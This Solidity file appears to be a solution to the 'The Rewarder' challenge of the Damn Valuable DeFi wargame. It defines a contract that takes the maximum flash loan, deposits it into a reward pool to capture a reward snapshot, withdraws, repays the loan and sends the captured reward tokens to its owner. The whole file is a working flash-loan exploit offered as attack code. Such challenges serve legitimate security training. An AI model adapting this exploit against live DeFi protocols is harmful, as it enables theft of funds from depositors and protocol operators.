// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderHack {
    DamnValuableToken liquidityToken;
    TheRewarderPool rewardPool;
    FlashLoanerPool flashPool;
    RewardToken rewardToken;

    address owner;

    constructor(
        DamnValuableToken _liquidityToken,
        TheRewarderPool _rewarderPool,
        FlashLoanerPool _flashPool,
        RewardToken _rewardToken
    ) {
        liquidityToken = _liquidityToken;
        rewardPool = _rewarderPool;
        flashPool = _flashPool;
        rewardToken = _rewardToken;
        owner = msg.sender;
    }

    //Takes flashloan, next attack is on `flashLoanReceived()`
    function attack() public {
        require(msg.sender == owner, "Only Owner");

        uint256 maxLoanAmount = liquidityToken.balanceOf(address(flashPool));
        flashPool.flashLoan(maxLoanAmount);
    }

    function receiveFlashLoan(uint256 amount) public {
        require(
            msg.sender == address(flashPool),
            "Only Flash Loan Pool can access"
        );
        // do things before paying back flashloan

        //approve the rewards pool to take my tokens when I deposit
        liquidityToken.approve(address(rewardPool), amount);

        //deposit to reward pool -> will call to distribute REWARDS
        rewardPool.deposit(amount);

        //withdraw from reward pool
        rewardPool.withdraw(amount);

        //repay flashloan
        SafeTransferLib.safeTransfer(
            address(liquidityToken),
            address(flashPool),
            amount
        );

        //send rewards to owner address
        uint256 rewards = rewardToken.balanceOf(address(this));
        SafeTransferLib.safeTransfer(address(rewardToken), owner, rewards);
    }

    receive() external payable {}
}
